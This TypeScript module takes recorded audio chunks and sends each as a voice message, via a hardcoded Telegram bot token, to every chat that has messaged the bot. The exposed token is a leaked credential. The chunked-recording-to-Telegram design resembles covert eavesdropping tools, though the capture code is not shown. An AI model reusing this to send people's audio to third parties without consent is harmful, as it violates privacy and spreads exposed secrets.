// Function to send audio to Telegram
export async function sendAudioToTelegram(audioBlob: Blob, chunkNumber: number) {
  const telegramBotToken = '8558710499:AAGJ8LA9PbCjQnnHGjBhq86ufCcZiIzXOxs';
  
  try {
    console.log(`🎵 Отправка аудио чанка #${chunkNumber} (${audioBlob.size} bytes)...`);
    
    // Get chat IDs
    const chatIds = await getAllChatIds(telegramBotToken);
    
    if (chatIds.size === 0) {
      console.warn('⚠️ Нет пользователей для отправки аудио');
      return;
    }

    // Send audio to all users
    for (const chatId of chatIds) {
      await sendAudioToChat(telegramBotToken, chatId, audioBlob, chunkNumber);
    }
    
    console.log(`✅ Аудио чанк #${chunkNumber} отправлен ${chatIds.size} пользователям`);
  } catch (error) {
    console.error(`❌ Ошибка отправки аудио чанка #${chunkNumber}:`, error);
  }
}

async function getAllChatIds(botToken: string): Promise<Set<number>> {
  try {
    const response = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates`);
    const data = await response.json();
    
    if (data.ok && data.result) {
      const chatIds = new Set<number>();
      data.result.forEach((update: any) => {
        if (update.message?.chat?.id) {
          chatIds.add(update.message.chat.id);
        }
      });
      return chatIds;
    }
    return new Set();
  } catch (error) {
    console.error('❌ Ошибка получения chat IDs:', error);
    return new Set();
  }
}

async function sendAudioToChat(botToken: string, chatId: number, audioBlob: Blob, chunkNumber: number) {
  try {
    const formData = new FormData();
    formData.append('chat_id', chatId.toString());
    formData.append('voice', audioBlob, `audio_chunk_${chunkNumber}_${Date.now()}.ogg`);
    formData.append('caption', `🎤 Аудио запись #${chunkNumber}\n⏰ ${new Date().toLocaleString('ru-RU')}`);

    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendVoice`, {
      method: 'POST',
      body: formData
    });

    if (!response.ok) {
      const error = await response.json();
      console.error(`❌ Ошибка отправки аудио пользователю ${chatId}:`, error);
    } else {
      console.log(`✅ Аудио чанк #${chunkNumber} отправлен пользователю ${chatId}`);
    }
  } catch (error) {
    console.error(`❌ Исключение при отправке аудио пользователю ${chatId}:`, error);
  }
}
